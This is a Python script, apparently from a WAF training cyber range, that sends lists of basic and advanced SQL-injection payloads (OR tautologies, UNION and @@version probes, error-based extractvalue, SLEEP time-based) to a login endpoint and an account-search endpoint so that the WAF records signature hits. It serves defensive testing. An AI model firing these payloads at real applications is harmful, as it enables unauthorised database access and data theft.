"""
sqli_signatures.py — fire a LIBRARY of SQL-injection payloads at the app.

F5 ADSP Cyber Range challenges:
    #1 SQL injection — basic (high-accuracy signatures).
    #2 SQL injection — advanced (UNION / @@version / error / boolean / time
       based — medium-accuracy signatures).
XC signal produced:
    WAF / OWASP Top 10 SQL-Injection signatures, of varying signature accuracy.
    The attack does NOT need to succeed — the point is to emit a spread of
    high- and medium-confidence SQLi matches the WAF can score and block.

Two sinks are hit with each payload:
    POST /api/auth/login                      (payload in the email + password)
    GET  /api/accounts/accounts/search?q=     (the raw-f-string SQLi sink)

Usage:
    python3 sqli_signatures.py                 # basic + advanced
    python3 sqli_signatures.py --set basic
    python3 sqli_signatures.py --set advanced
    python3 sqli_signatures.py --user bob      # which seeded user to auth as
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import BASE_URL, SEEDED_USERS, auth_headers, login, make_client

# High-accuracy / high-confidence: unambiguous tautologies and comment breaks.
BASIC_PAYLOADS = [
    "' OR '1'='1",
    "admin'--",
    "' OR 1=1--",
    '") OR ("1"="1',
]

# Medium-accuracy: UNION column-count probes, @@version extraction, error-,
# boolean- and time-based techniques. A WAF scores these with lower confidence.
ADVANCED_PAYLOADS = [
    "0' UNION SELECT 1,2,3,4,MID(@@version,1,50),6,7 FROM users#",
    "' UNION SELECT NULL,NULL--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND '1'='1",
    "' OR SLEEP(3)--",
]


def hit_login(client, payload):
    r = client.post("/api/auth/login", json={"email": payload, "password": payload})
    return r.status_code


def hit_search(client, hdrs, payload):
    r = client.get("/api/accounts/accounts/search", headers=hdrs, params={"q": payload})
    return r.status_code


def main():
    ap = argparse.ArgumentParser(description="SQLi signature generator (basic + advanced).")
    ap.add_argument("--set", choices=["basic", "advanced", "all"], default="all")
    ap.add_argument("--user", default="alice", choices=list(SEEDED_USERS),
                    help="seeded user to auth as (a token is needed to reach the search sink)")
    args = ap.parse_args()

    sets = []
    if args.set in ("basic", "all"):
        sets.append(("BASIC/high-accuracy", BASIC_PAYLOADS))
    if args.set in ("advanced", "all"):
        sets.append(("ADVANCED/medium-accuracy", ADVANCED_PAYLOADS))

    creds = SEEDED_USERS[args.user]
    print(f"Target: {BASE_URL}  (login sink + accounts/search sink as {args.user})")
    print("lab-only — generating WAF SQLi signals, success not required\n")

    results = []
    with make_client() as client:
        try:
            token, _ = login(client, creds["email"], creds["password"])
            hdrs = auth_headers(token)
        except Exception as exc:  # noqa: BLE001
            print(f"  (could not log in for the search sink: {exc}; login sink only)")
            hdrs = None

        for label, payloads in sets:
            print(f"--- {label} ---")
            for p in payloads:
                s_login = hit_login(client, p)
                s_search = hit_search(client, hdrs, p) if hdrs is not None else "-"
                results.append((label, p, s_login, s_search))
                print(f"  login={s_login}  search={s_search}  payload={p!r}")
            print()

    print("--- report ---")
    print(f"payload sets sent: {', '.join(l for l, _ in sets)}")
    print(f"total injection requests: {len(results) * (2 if results and results[0][3] != '-' else 1)}")
    print("status codes above are expected to be 4xx/200 — the WAF match, not a "
          "successful dump, is the signal here.")


if __name__ == "__main__":
    main()
